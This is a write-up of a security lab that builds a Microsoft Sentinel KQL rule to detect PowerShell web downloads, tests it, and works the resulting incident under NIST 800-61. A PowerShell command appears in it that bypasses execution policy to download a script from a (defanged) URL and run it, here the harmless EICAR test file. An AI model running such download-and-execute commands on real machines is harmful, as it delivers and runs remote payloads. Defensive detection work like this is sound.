# Project: Creating a Sentinel Detection Rule for Malicious Downloads

### 1. Project Objective

This project demonstrates the end-to-end process of creating a custom detection rule in Microsoft Sentinel and then working the resulting incident to completion. The goal was to design a query that detects when PowerShell's `Invoke-WebRequest` command is used to download remote files, a common tactic used by attackers for post-exploitation activities.

---

### 2. Detection Rule Creation & Configuration

#### The Detection Logic
A KQL (Kusto Query Language) query was designed to search the `DeviceProcessEvents` table for any command-line activity involving PowerShell and the `Invoke-WebRequest` cmdlet (or its common aliases `iwr` and `wget`).

**The KQL Query:**
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-06-06T04:49:00Z) .. datetime(2025-06-07T04:38:00Z)) // Pinned time range for report integrity. A live rule would use: | where TimeGenerated >= ago(24h)
| where (FileName contains "powershell.exe" or FileName contains "pwsh.exe") 
  and (ProcessCommandLine contains "Invoke-WebRequest" or ProcessCommandLine contains "iwr" or ProcessCommandLine contains "wget")
| project TimeGenerated, AccountName, DeviceName, FileName, InitiatingProcessCommandLine, ProcessCommandLine
| sort by TimeGenerated desc

```

#### Sentinel Rule Configuration
In Microsoft Sentinel, this KQL query was used to create a new Scheduled Analytics Rule with the following settings:

* **Query Scheduling:** Run query every 4 hours, looking up data from the last 24 hours.
* **Entity Mapping:** To enable automatic incident correlation and investigation features, the following entities were mapped from the query's output columns:
  
| Entity  | Identifier  | Value              |
| :------ | :---------- | :------------------|
| Account | Name        | AccountName        |
| Host    | HostName    | DeviceName         |
| Process | CommandLine | ProcessCommandLine |

### 3. Simulating the Attack & Triggering the Alert
To validate the rule, a command was executed on a test virtual machine to simulate an attacker downloading a payload. This command downloads the harmless EICAR test file and then executes it. Although the download is harmless the URI was defanged as a good practice.

```powershell
# Download the script
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'hxxps://raw[.]githubusercontent[.]com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar[.]ps1' -OutFile 'C:\programdata\eicar.ps1';

# Execute the script
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```

---
### 4. Incident Response (Following NIST 800-61)
The simulation successfully triggered the "Z-PowerShell Suspicious Web Request" incident in Sentinel. The incident was triaged and worked to completion following the NIST Incident Response Lifecycle.

#### Detection and Analysis
The triggered alert showed that over a 24-hour period, 35 machines had downloaded suspicious scripts from a GitHub repository. The most notable scripts were:

* `portscan.ps1`
* `pwncrypt.ps1`
* `eicar.ps1`
* `exfiltratedata.ps1`

The malware analysis team provided a one-liner for each script's purpose:

* `exfiltratedata.ps1`: A script that compresses user data for theft and exfiltration.
* `portscan.ps1`: A reconnaissance script used to scan a network for open ports.
* `pwncrypt.ps1`: A ransomware script designed to encrypt a victim's files for extortion.
* `eicar.ps1`: A harmless test file to verify antivirus detection.

#### Containment, Eradication, and Recovery
* **Containment:** All 35 affected devices were immediately isolated using Microsoft Defender for Endpoint to prevent any further damage or lateral movement.
* **Eradication:** An antivirus scan was initiated on all isolated devices.
* **Recovery:** A plan was put in place with the IT team to reimage all affected machines to ensure they are restored to a known-good state.

#### Post-Incident Activities
The investigation revealed that the activity was likely triggered by a coordinated phishing campaign.

* **User Training:** Worked with management to facilitate a phishing training exercise, as several users reported clicking a suspicious email regarding bonuses.
* **Policy Hardening:** Began the implementation of a new security policy to restrict the use of PowerShell for all non-essential users, reducing the attack surface.
* **Case Closure:** The incident was officially closed in Sentinel as a True Positive.
